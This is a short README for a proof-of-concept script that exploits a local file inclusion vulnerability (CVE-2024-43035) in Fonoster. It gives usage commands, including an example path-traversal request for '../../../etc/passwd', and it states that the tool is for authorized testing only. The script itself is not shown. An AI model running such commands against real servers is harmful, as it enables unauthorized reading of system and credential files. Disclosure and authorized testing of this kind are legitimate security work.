# CVE-2024-43035 - Fonoster LFI Proof of Concept

This repository contains a Proof of Concept (PoC) script demonstrating a [Local File Inclusion vulnerability in Fonoster](https://zeropath.com/blog/fonoster-voiceserver-lfi-vulnerability). **This tool is for educational and authorized testing purposes only.**

## Usage

### Read Local File
To retrieve a local file from the server:
```
python3 fonoster_lfi_poc.py --url <fonoster_server_url> --path <file_path_to_retrieve>
```

Example:

```
python3 fonoster_lfi_poc.py --url http://example.com --path "../../../etc/passwd"
```
z
